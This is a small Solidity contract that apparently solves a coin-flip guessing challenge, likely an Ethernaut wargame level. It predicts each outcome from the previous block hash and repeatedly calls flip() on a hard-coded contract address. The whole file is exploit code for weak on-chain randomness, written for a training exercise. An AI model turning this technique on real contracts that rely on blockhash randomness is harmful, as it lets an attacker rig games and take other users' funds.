// SPDX-License-Identifier: MIT
pragma solidity >=0.8.4;

interface Iflip {
    function flip(bool _guess) external returns (bool);
}

contract Naut {
    constructor() {}

    function test() public {
        for (uint i = 0; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue /
                57896044618658097711785492504343953926634992332820282019728792003956564819968;
            bool side = coinFlip == 1 ? true : false;

            Iflip(0xB4a7Fa6Ab9B3f2274A94Fd72FFA95e25f83C99a3).flip(side);
        }
    }
}